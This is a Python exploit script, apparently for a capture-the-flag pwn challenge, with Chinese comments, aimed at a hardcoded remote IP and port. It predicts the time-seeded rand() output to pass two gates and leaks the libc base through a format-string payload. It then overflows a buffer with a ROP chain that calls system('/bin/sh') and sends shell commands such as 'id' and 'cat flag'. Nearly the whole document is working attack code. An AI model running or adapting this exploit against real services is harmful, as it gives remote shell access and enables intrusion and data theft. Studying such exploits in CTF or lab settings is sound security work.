#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""远程单次调试：打印每个阶段的原始回显"""
import socket, sys, time, re

HOST, PORT = "103.163.47.230", 35118
M32 = 0xFFFFFFFF
OFF_LIBC_START_RET = 0x2A1CA
LIBC_SYSTEM, LIBC_BINSH, LIBC_POP_RDI, LIBC_RET = 0x58750, 0x1CB42F, 0x10C08D, 0x10C08E


def rand_of(seed):
    r = [0] * 400
    seed &= M32
    if seed == 0:
        seed = 1
    r[0] = seed
    for i in range(1, 31):
        hi, lo = divmod(r[i - 1], 127773)
        w = 16807 * lo - 2836 * hi
        if w < 0:
            w += 2147483647
        r[i] = w & M32
    for i in range(31, 34):
        r[i] = r[i - 31]
    for i in range(34, 344):
        r[i] = (r[i - 31] + r[i - 3]) & M32
    return ((r[344 - 31] + r[344 - 3]) & M32) >> 1


def p64(x):
    return x.to_bytes(8, "little")


class S:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=6)
        self.s.settimeout(0.5)
        self.buf = b""

    def send(self, d):
        self.s.sendall(d)

    def pump(self, t=0.6):
        end = time.time() + t
        got = b""
        while time.time() < end:
            try:
                c = self.s.recv(4096)
                if not c:
                    break
                got += c
            except socket.timeout:
                pass
        self.buf += got
        return got

    def until(self, m, t=6):
        m = m.encode() if isinstance(m, str) else m
        end = time.time() + t
        while m not in self.buf:
            if time.time() > end:
                raise TimeoutError("want %r got %r" % (m, self.buf[-80:]))
            self.pump(0.2)
        i = self.buf.index(m) + len(m)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out


def run(skew, payload_tail, cmds=b"echo PWNED; id; ls\n"):
    c = S()
    c.until("让游戏开始吧")
    c.send(str(rand_of(int(time.time()) + skew)).encode() + b"\n")
    c.until("说出你想要说的话吧")
    c.send(b"%15$p.%17$p\n")
    leak = c.until("做出你的选择吧")
    vals = re.findall(rb"0x[0-9a-f]+", leak)
    print("LEAK:", [v.decode() for v in vals])
    libc = int(vals[-1], 16) - OFF_LIBC_START_RET
    print("libc base = %#x" % libc)

    c.send(str(rand_of(int(time.time()) + skew)).encode() + b"\n")
    try:
        c.until("做你想要做的事吧")
    except TimeoutError as e:
        print("gate2 失败:", e)
        return
    print("已到 get_name，准备发送 payload")

    payload = b"A" * 0x40 + b"B" * 8 + payload_tail(libc)
    print("payload 长度 = %d (0x70=112)" % len(payload))
    c.send(payload)
    time.sleep(0.4)
    print("发送后回显:", c.pump(0.8))
    c.send(cmds)
    time.sleep(0.6)
    print("命令回显:", c.pump(1.5))
    c.s.close()


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "shell"
    binsh = int(sys.argv[2], 16) if len(sys.argv) > 2 else LIBC_BINSH
    for _ in range(10):
        try:
            if mode == "puts":
                # rdi = libc 里的 "/bin/sh" 字符串，调用 puts → 应该打印出来
                run(2, lambda b: p64(b + LIBC_RET) + p64(b + LIBC_POP_RDI) + p64(b + 0x1CB42F) + p64(b + 0x87CC0))
            elif mode == "elf":
                # rdi = libc 基址，puts 应该打印 "\x7fELF"
                run(2, lambda b: p64(b + LIBC_RET) + p64(b + LIBC_POP_RDI) + p64(b) + p64(b + 0x87CC0))
            elif mode == "shell":
                run(2, lambda b: p64(b + LIBC_RET) + p64(b + LIBC_POP_RDI) + p64(b + binsh) + p64(b + LIBC_SYSTEM))
            elif mode == "flag":
                run(2, lambda b: p64(b + LIBC_RET) + p64(b + LIBC_POP_RDI) + p64(b + 0x1CC42F) + p64(b + LIBC_SYSTEM),
                    cmds=b"cat flag; cat /flag; cat flag.txt; echo DONE\n")
            break
        except TimeoutError as e:
            print("重试:", e)
            time.sleep(0.3)
